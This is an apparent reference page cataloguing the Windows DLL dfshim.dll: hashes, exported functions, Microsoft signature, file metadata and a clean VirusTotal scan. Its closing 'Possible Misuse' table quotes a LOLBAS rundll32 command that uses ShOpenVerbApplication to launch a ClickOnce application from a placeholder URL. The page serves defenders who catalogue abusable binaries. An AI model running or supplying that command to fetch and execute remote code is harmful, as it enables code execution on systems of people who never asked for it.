---
title: dfshim.dll | ClickOnce Application Deployment Support Library
excerpt: What is dfshim.dll?
---

# dfshim.dll 

* File Path: `C:\Windows\SysWOW64\dfshim.dll`
* Description: ClickOnce Application Deployment Support Library

## Hashes

Type | Hash
-- | --
MD5 | `33EEBE89A948E80913684767D2E2FCCB`
SHA1 | `0C95B7668C59710DDEE78EC81065E20D1C2C0901`
SHA256 | `785CD48D1B1046A69224913E17F229ED7B32E4608752C60DDB8CC77D38509F29`
SHA384 | `CF429D268A169770D58646D3A5198F35E4F49DE194992E39FFEDBE0B3A692CF9DF3EF6A3905B13C5D6C0F1D4878B4242`
SHA512 | `3A878968F9F67B299D0DEE0BF67211FC8E1080DFE4F60C65C060219D14B034DA785F25BE946A2CC26C9DBC73A1B68691459EEB700667960C6DCD9C6BCB250968`
SSDEEP | `24576:TTpsIQgDUCbQ0yB37en7Eb4hD8mOYgVgbqrwjgVSgSo9S3:TT+IBpRygnwbCUgR8IMS3`
IMP | `59DFB930FACB30E982DE67DA5B163048`
PESHA1 | `7E0C04F3B6E88C342A8C201A00F87764F7B82CC0`
PE256 | `286010269C5B131051E537F3E0E58975503A5C52F6E065BA29972F3676550242`

## DLL Exports:

Function Name | Ordinal | Type | Address | Relative Address
-- | -- | -- | -- | --
`CleanOnlineAppCache` | 17 (0x11) | Exported Function | 0x10023b20 | 0x00023b20
`ShOpenVerbExtensionW` | 14 (0xe) | Exported Function | 0x10023a30 | 0x00023a30
`ShOpenVerbExtension` | 13 (0xd) | Exported Function | 0x10023a50 | 0x00023a50
`ShOpenVerbApplicationW` | 12 (0xc) | Exported Function | 0x100239f0 | 0x000239f0
`ShOpenVerbApplication` | 11 (0xb) | Exported Function | 0x10023a10 | 0x00023a10
`ShArpMaintainW` | 10 (0xa) | Exported Function | 0x10023aa0 | 0x00023aa0
`ShArpMaintain` | 9 (0x9) | Exported Function | 0x10023ad0 | 0x00023ad0
`ParseManifest` | 8 (0x8) | Exported Function | 0x100268f0 | 0x000268f0
`LaunchApplication` | 7 (0x7) | Exported Function | 0x10023a70 | 0x00023a70
`KillService` | 6 (0x6) | Exported Function | 0x10023b00 | 0x00023b00
`GetUserStore` | 5 (0x5) | Exported Function | 0x10026870 | 0x00026870
`GetUserStateManager` | 4 (0x4) | Exported Function | 0x100268b0 | 0x000268b0
`GetDeploymentDataFromManifest` | 20 (0x14) | Exported Function | 0x10023b70 | 0x00023b70
`GetCurrentActContext` | 3 (0x3) | Exported Function | 0x100269c0 | 0x000269c0
`DllGetClassObject` | 19 (0x13) | Exported Function | 0x10023820 | 0x00023820
`DllCanUnloadNow` | 18 (0x12) | Exported Function | 0x10023800 | 0x00023800
`CreateCMSFromXml` | 2 (0x2) | Exported Function | 0x10026930 | 0x00026930
`CreateActContext` | 1 (0x1) | Exported Function | 0x10026980 | 0x00026980
`ShOpenVerbShortcut` | 15 (0xf) | Exported Function | 0x10023960 | 0x00023960
`ShOpenVerbShortcutW` | 16 (0x10) | Exported Function | 0x10023880 | 0x00023880


## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: dfshim.dll
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/69
* VirusTotal Link: https://www.virustotal.com/gui/file/785cd48d1b1046a69224913e17f229ed7b32e4608752c60ddb8cc77d38509f29/detection/


## Possible Misuse

*The following table contains possible examples of `dfshim.dll` being misused. While `dfshim.dll` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dfsvc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dfsvc.yml) | `- Command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo ` | 



MIT License. Copyright (c) 2020 Strontic.


